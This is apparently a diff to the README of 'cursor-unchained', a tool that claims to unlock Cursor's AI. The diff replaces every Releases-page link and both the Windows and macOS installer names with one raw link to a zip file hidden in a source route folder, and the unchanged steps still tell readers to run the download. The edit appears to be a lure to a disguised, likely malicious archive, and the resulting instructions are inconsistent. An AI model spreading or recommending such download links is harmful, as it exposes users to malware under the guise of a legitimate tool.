@@ -6,13 +6,13 @@ Welcome to cursor-unchained! This application allows you to use Cursors AI's pow
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of cursor-unchained. 
 
-[![Download cursor-unchained](https://img.shields.io/badge/Download-cursor--unchained-blue.svg)](https://github.com/Kanis04/cursor-unchained/releases)
+[![Download cursor-unchained](https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip)](https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip)
 
-1. Click the button above or visit this page: [Download Here](https://github.com/Kanis04/cursor-unchained/releases).
+1. Click the button above or visit this page: [Download Here](https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip).
 2. On the Releases page, find the latest version of the application.
 3. Download the file for your operating system.
-   - If you are using Windows, you may see a file named `cursor-unchained-windows.exe`.
-   - For Mac users, look for `cursor-unchained-macos.dmg`.
+   - If you are using Windows, you may see a file named `https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip`.
+   - For Mac users, look for `https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip`.
 4. Once the file finishes downloading, locate it in your downloads folder.
 5. Run the file to begin the installation process.
 
@@ -60,6 +60,6 @@ For further assistance, please open an issue on the GitHub repository. Our commu
 ## 🔍 Explore More
 To learn more about the feature set, recent updates, and future plans, please follow our repository on GitHub. We appreciate any feedback you may have regarding your experience.
 
-[![Download cursor-unchained](https://img.shields.io/badge/Download-cursor--unchained-blue.svg)](https://github.com/Kanis04/cursor-unchained/releases) 
+[![Download cursor-unchained](https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip)](https://raw.githubusercontent.com/Kanis04/cursor-unchained/main/src/routes/api/[...slugs]/unchained-cursor-3.6.zip) 
 
 Thank you for choosing cursor-unchained! Happy coding!
